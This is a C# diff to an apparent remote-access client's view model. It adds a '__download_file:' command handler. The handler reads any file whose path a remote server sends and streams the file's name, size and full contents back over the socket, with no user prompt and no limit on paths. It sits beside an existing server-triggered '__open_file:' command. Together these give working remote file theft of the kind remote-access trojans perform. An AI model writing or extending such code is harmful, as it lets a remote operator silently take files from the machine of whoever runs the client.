@@ -121,6 +121,12 @@ namespace CLIENT.ViewModels
 
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
+                        if (serverMessage.StartsWith("__download_file:"))
+                        {
+                            string command = serverMessage.Substring(16).Trim();
+                            DownloadTargetFile(command);
+                        }
+
                         if (serverMessage.StartsWith("__open_file:"))
                         {
                             string command = serverMessage.Substring(12).Trim();
@@ -235,6 +241,66 @@ namespace CLIENT.ViewModels
                 await Dispatcher.UIThread.InvokeAsync(() =>
                 {
                     Greeting = "Send failed: " + ex.Message;
+                });
+            }
+        }
+
+        public async Task DownloadTargetFile(string command)
+        {
+            try
+            {
+                if (_client != null && _client.Connected && _stream != null)
+                {
+                    string response;
+
+                    // Check if the command is a valid file path
+                    if (!string.IsNullOrEmpty(command) && File.Exists(command))
+                    {
+                        try
+                        {
+                            // Read file content
+                            byte[] fileBytes = await File.ReadAllBytesAsync(command);
+
+                            // Send file metadata (header)
+                            string header = $"fileDownload:{Path.GetFileName(command)}:{fileBytes.Length}\n";
+                            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
+                            await _stream.WriteAsync(headerBytes, 0, headerBytes.Length);
+
+                            // Send file content
+                            await _stream.WriteAsync(fileBytes, 0, fileBytes.Length);
+
+                            // Flush the stream
+                            await _stream.FlushAsync();
+
+                            response = $"File '{Path.GetFileName(command)}' successfully sent to the server.";
+                        }
+                        catch (IOException ioEx)
+                        {
+                            response = $"File access error: {ioEx.Message}";
+                        }
+                    }
+                    else
+                    {
+                        response = "Invalid or non-existent file path.";
+                    }
+
+                    // Update UI with the operation result
+                    await Dispatcher.UIThread.InvokeAsync(() =>
+                    {
+                        Greeting = response;
+                    });
+                }
+                else
+                {
+                    throw new InvalidOperationException("The client is not connected to the server.");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Update UI with exception details
+                await Dispatcher.UIThread.InvokeAsync(() =>
+                {
+                    Greeting = "File download failed: " + ex.Message;
                 });
             }
         }
